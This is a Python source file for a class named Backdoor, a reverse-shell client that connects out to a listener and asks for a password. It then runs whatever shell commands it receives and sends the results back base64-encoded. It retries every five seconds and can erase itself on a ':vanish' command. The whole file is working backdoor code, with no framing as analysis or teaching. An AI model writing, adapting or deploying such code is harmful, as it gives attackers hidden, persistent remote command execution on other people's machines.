import socket
import subprocess
import time
import os
import base64

class Backdoor(object):
    def __init__(self, host, port, passwd):
        self.__host = host
        self.__port = port
        self.__passwd = passwd
        self.__next_msg = list()
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __encode(self, data):
        encoded = data.encode()
        encoded = base64.b64encode(encoded)
        return encoded

    def __decode(self, data):
        decoded = base64.b64decode(data)
        decoded = decoded.decode()
        return decoded

    def __msg(self, msg):
        self.__next_msg.append(msg)

    def __send(self):
        msg = '\n'.join(self.__next_msg)
        self.__next_msg.clear()
        self.__sock.send(self.__encode(msg))

    def __recv(self):
        return self.__decode(self.__sock.recv(1024))

    def __send_and_recv(self):
        self.__send()
        return self.__recv()

    def __execute_code(self, code):
        proc = subprocess.Popen(
            code,
            shell = True,
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE)

        stdout = proc.stdout.read().decode()
        stderr = proc.stderr.read().decode()
        out = stdout
        if stderr != '':
            out = stderr
        return out

    def login_loop(self):
        while True:
            self.__msg('Login: ')
            passwd = self.__send_and_recv()
            if self.__passwd == passwd:
                remote_login = self.__execute_code('whoami').strip()
                remote_os = self.__execute_code('uname -a').strip()

                welcome = '\n'.join([
                    'Logged in into remote shell.',
                    '',
                    'Remote login name: ' + remote_login,
                    'OS: ' + remote_os,
                    '\n',
                ])
                self.__msg(welcome)
                return True
            else:
                self.__msg('Denied.\n')

    def cmd_loop(self):
        while True:
            self.__msg('#>')
            data = self.__send_and_recv()

            if data == ':vanish':
                self.__msg('Slave Vanishing...')
                self.__send()
                os._exit(0)
            
            out = self.__execute_code(data)
            self.__msg(out)

    def test_loop(self):
        while True:
            data = self.__sock.recv(1024)
            self.__msg('ok')
            self.__send()
            print(data)

    def open(self):
        self.__sock.connect((self.__host, self.__port))
        #if not self.login_loop():
        #    return
        
        self.test_loop()
        #self.cmd_loop()


if __name__ == '__main__':
    while True:
        try:
            Backdoor('127.0.0.1', 8080, 'sys').open()
        except:
            time.sleep(5)
